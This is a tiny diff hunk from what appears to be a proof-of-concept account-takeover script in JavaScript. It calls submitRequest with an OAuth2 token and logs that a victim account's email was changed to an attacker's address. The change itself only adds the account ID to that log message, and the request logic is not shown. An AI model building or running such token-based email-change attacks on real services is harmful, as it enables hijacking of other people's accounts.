@@ -24,4 +24,4 @@ function submitRequest( oa2_token )
 }
 submitRequest(oa2_token);
 
-console.log("Email changed to "+ attacker_email );
+console.log("Email( "+ account_id +" ) changed to "+ attacker_email );
